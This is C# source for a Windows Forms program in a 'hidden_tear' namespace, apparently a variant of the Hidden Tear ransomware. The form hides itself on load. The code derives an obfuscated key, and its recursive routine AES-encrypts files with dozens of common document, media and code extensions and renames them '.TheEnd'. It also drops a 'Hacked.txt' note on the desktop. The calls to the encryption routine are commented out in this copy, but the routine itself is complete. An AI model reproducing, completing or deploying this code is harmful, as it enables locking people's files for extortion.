
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using EncryptStringSample;
using System.IO.Compression;

namespace hidden_tear
{

    
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string Start = "اللهم يا هازم الاحزاب اللهم زلزل الاقدام من تحت هولاء الكفرة فانهم طغوا وافسدوا في الديار";
        string Password = "WW91Y2Fubm90Y3JhY2t0aGlzQWxnb3JpdGhteW91YXJlPmlkaW90PA==";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        static System.Collections.Specialized.StringCollection log = new System.Collections.Specialized.StringCollection();

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

       

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".TheEnd");


        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {

            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".index", ".pdf", ".zip", ".rar", ".css", ".lnk", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".bmp", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".bk", ".bat", ".mp3", ".mp4", ".wav", ".wma", ".avi", ".divx", ".mkv", ".mpeg", ".wmv", ".mov", ".ogg"
            };
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                    for (int i = 0; i < files.Length; i++)
                    {
                        try
                        {    
                            string extension = Path.GetExtension(files[i]);
                            if (validExtensions.Contains(extension))
                            {
                            EncryptFile(files[i], password);
                            }
                         }
                        catch (SystemException)
                        {
                            continue;
                        }
                    }
                for (int i = 0; i < childDirectories.Length; i++)
                {   
                    try
                    {
                        encryptDirectory(childDirectories[i],password);
                    }
                    catch (SystemException)
                    {
                        continue;
                    }
                }
             

        }
       
        public void startAction()
        {
            
            string Asd = "YmNkZWZnaGkzamtsbW5vcHFyc3QlXl4mI0B1dnd4eXpBQkNERUZHSEkmIzE1NzY7JiMxNTg3OyYjMTYwNTsgJiMxNTc1OyYjMTYwNDsmIzE2MDQ7JiMxNjA3OyAmIzE1NzU7JiMxNjA0OyYjMTU4NTsmIzE1ODE7JiMxNjA1OyYjMTYwNjsgJiMxNTc1OyYjMTYwNDsmIzE1ODU7JiMxNTgxOyYjMTYxMDsmIzE2MDU7WjEyMzQ1Njc4OTAgKiE9ICY / ICYvICYjMTU4ODtiJiMxNTg3O2RlZmdoaWprbG0mIzE2MDI7NCYjMTYwMjsmIzE1NzU7JiMxNTc4OyYjMTYwNDsmIzE2MDg7JiMxNjA3OyYjMTYwNTsgJiMxNjEwOyYjMTU5MzsmIzE1ODQ7JiMxNTc2OyYjMTYwNzsmIzE2MDU7ICYjMTU3NTsmIzE2MDQ7JiMxNjA0OyYjMTYwNzsgNjc4OTAgKiE9ICY / ICYv";
            var dead = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Asd));
            byte[] data = Convert.FromBase64String(Asd);
            byte[] data2 = Convert.FromBase64String(Password);
            string decodedString1 = Encoding.UTF8.GetString(data);
            string decodedString2 = Encoding.UTF8.GetString(data2);
            string decodedString3 = Encoding.Unicode.GetString(data);
            string end = decodedString1 + decodedString2 ;
            end = end.Replace("1", "J").Replace("6", "I").Replace("0", "H").Replace("4", "A").Replace(";", "D");
            string encryptedstring = StringCipher.Encrypt(end, dead);

            string md1 = StringCipher.Encrypt(encryptedstring, end);
             md1 = md1.Replace("a", "").Replace("b", "").Replace("c", "").Replace("d", "")
                .Replace("e", "").Replace("f", "").Replace("h", "").Replace("i", "").Replace("g", "").Replace("k", "")
                .Replace("l", "").Replace("n", "").Replace("o", "").Replace("p", "").Replace("u", "").Replace("v", "")
                .Replace("y", "").Replace("t", "").Replace("r", "").Replace("w", "").Replace("q", "")
                .Replace("s", "").Replace("f", "").Replace("j", "").Replace("x", "").Replace("z", "")
                .Replace("A", "").Replace("B", "").Replace("C", "").Replace("D", "").Replace("K", "")
                .Replace("E", "").Replace("F", "").Replace("H", "").Replace("I", "").Replace("G", "")
                .Replace("L", "").Replace("N", "").Replace("O", "").Replace("P", "").Replace("U", "")
                .Replace("Y", "").Replace("T", "").Replace("R", "").Replace("W", "").Replace("Q", "")
                .Replace("S", "").Replace("F", "").Replace("J", "").Replace("X", "").Replace("Z", "").Replace("M", "")
                .Replace("/", "").Replace("+", "").Replace("=", "").Replace(" ", "").Replace("m", "").Replace("V", "")
             .Replace("0", "").Replace("2", "").Replace("9", "").Replace("3", "").Replace("4", "").Replace("5", "").Replace("6", "").Replace("7", "").Replace("8", "");


            string md5 = "182H4%a4c4k5e678d3B$$y9A9321n934o567n$789ym5543o221u11s432C0a#u32c1$a00s1$u2s3$";
            string md4 = "12y33o4u5a64r790e887s999o543f2a2r1t4o70c00r54a5c6k5M21e$";
            string m5 = md5.Replace("0", "").Replace("2", "").Replace("1", "").Replace("3", "").Replace("4", "").Replace("5", "").Replace("6", "").Replace("7", "").Replace("8", "").Replace("9", "").Replace("$", "");
            string m4 = md4.Replace("0", "").Replace("2", "").Replace("1", "").Replace("3", "").Replace("4", "").Replace("5", "").Replace("6", "").Replace("7", "").Replace("8", "").Replace("9", "").Replace("$", "");

            string real = m5 + decodedString3 + end + md1;

















           



           

            string path = "\\Desktop\\test";
            //string pa1 = "\\Downloads";
            //string pa2 = "\\Documents";
            //string pa3 = "\\Pictures";
            //string pa4 = "\\Music";
            //string pa5 = "\\Videos";
            string startPath = userDir + userName + path;

            //string startPa1 = userDir + userName + pa1;
            //string startPa2 = userDir + userName + pa2;
            //string startPa3 = userDir + userName + pa3;
            //string startPa4 = userDir + userName + pa4;
            //string startPa5 = userDir + userName + pa5;
            //encryptDirectory(startPath, real);
            //encryptDirectory(startPa1, real);
            //encryptDirectory(startPa2, real);
            //encryptDirectory(startPa3, real);
            //encryptDirectory(startPa4, real);
            //encryptDirectory(startPa5, real);

            string[] drives = System.Environment.GetLogicalDrives();
            foreach (string dr in drives)
            {
                System.IO.DriveInfo di = new System.IO.DriveInfo(dr);
                if (di.IsReady)
                {
                    System.IO.DirectoryInfo rootDir = di.RootDirectory;
                    //WalkDirectoryTree(rootDir);
                }

            }

           


            messageCreator();
            real = null;
            System.Windows.Forms.Application.Exit();
        }
            
        public void messageCreator()
        {
            string path = "\\Desktop\\Hacked.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "hi all" };
            System.IO.File.WriteAllLines(fullpath, lines);


        }

        //static void WalkDirectoryTree(System.IO.DirectoryInfo root)
        //{
        //    System.IO.FileInfo[] files = null;
        //    System.IO.DirectoryInfo[] subDirs = null;

        //    try
        //    {files = root.GetFiles("*.*");}
        //    catch (UnauthorizedAccessException e)
        //    {
        //        log.Add(e.Message);
        //    }
            
        //    catch (System.IO.DirectoryNotFoundException e){}

        //    if (files != null)
        //    {
        //        foreach (System.IO.FileInfo fi in files)
        //        {
        //            // In this example, we only access the existing FileInfo object. If we
        //            // want to open, delete or modify the file, then
        //            // a try-catch block is required here to handle the case
        //            // where the file has been deleted since the call to TraverseTree().
        //        }

        //        // Now find all the subdirectories under this directory.
        //        subDirs = root.GetDirectories();
        //        foreach (System.IO.DirectoryInfo dirInfo in subDirs)
        //        {
        //            // Resursive call for each subdirectory.
        //            WalkDirectoryTree(dirInfo);
        //        }
        //    }
        //}
    }
}

